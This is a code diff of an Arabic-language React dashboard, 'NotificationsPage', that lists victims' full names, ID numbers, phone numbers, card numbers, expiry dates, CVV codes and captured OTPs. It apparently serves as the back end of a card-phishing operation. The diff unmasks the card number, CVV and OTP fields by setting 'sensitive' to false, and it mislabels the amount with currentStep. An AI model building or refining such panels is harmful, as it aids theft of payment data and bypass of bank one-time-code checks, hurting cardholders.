@@ -105,12 +105,12 @@ interface Notification {
   network: string
   phoneOtp: string
   paymentExpiry: string
-  name: string
+  fullName: string
   phone: string
   flagColor?: string
 }
   currentPage?: string
-  amount?: string
+  currentStep?: string
   step?: number
   otp: string
   allOtps:string[] 
@@ -1055,7 +1055,7 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase()
       filtered = filtered.filter(
         (notification) =>
-          notification.data?.name?.toLowerCase().includes(term) ||
+          notification.data?.fullName?.toLowerCase().includes(term) ||
           notification.data?.email?.toLowerCase().includes(term) ||
           notification.data?.phone?.toLowerCase().includes(term) ||
           notification.data?.paymentCardNumber?.toLowerCase().includes(term) ||
@@ -1711,7 +1711,7 @@ export default function NotificationsPage() {
                           <td className="px-6 py-4">
                             <div className="flex flex-wrap gap-2">
                               <InfoBadge
-                                active={notification.data?.phone || notification.data?.name}
+                                active={notification.data?.phone || notification.data?.fullName}
                                 onClick={() => handleInfoClick(notification, "personal")}
                                 icon={User}
                                 text="معلومات شخصية"
@@ -1811,7 +1811,7 @@ export default function NotificationsPage() {
           {selectedNotification && selectedInfo === "personal" && (
             <InfoSection
               items={[
-                { label: "الاسم", value: selectedNotification.data?.name },
+                { label: "الاسم", value: selectedNotification.data?.fullName },
                 { label: "رقم الهوية", value: selectedNotification.data?.idNumber, sensitive: true },
                 { label: "الشبكة", value: selectedNotification.data?.network },
                 { label: "رقم الجوال", value: selectedNotification.data?.mobile, sensitive: true },
@@ -1828,19 +1828,19 @@ export default function NotificationsPage() {
                 {
                   label: "رقم البطاقة",
                   value: selectedNotification.data?.paymentCardNumber
-                    ? `${selectedNotification.data?.paymentCardNumber}}`
+                    ? `${selectedNotification.data?.paymentCardNumber}`
                     : undefined,
-                  sensitive: true,
+                  sensitive: false,
                 },
                 {
                   label: "تاريخ الانتهاء",
                   value:
                     selectedNotification.data?.paymentExpiry,
                 },
-                { label: "رمز الأمان (CVV)", value: selectedNotification.data?.paymentCVV, sensitive: true },
-                { label: "رمز التحقق (OTP)", value: selectedNotification.otp, sensitive: true },
-                { label: "الخطوة الحالية", value: selectedNotification.step },
-                { label: "المبلغ", value: selectedNotification.amount },
+                { label: "رمز الأمان (CVV)", value: selectedNotification.data?.paymentCVV, sensitive: false },
+                { label: "رمز التحقق (OTP)", value: selectedNotification.otp, sensitive: false },
+                { label: "الخطوة الحالية", value: selectedNotification.currentStep },
+                { label: "المبلغ", value: selectedNotification?.currentStep },
               ]}
               additionalOtps={selectedNotification?.allOtps!}
             />
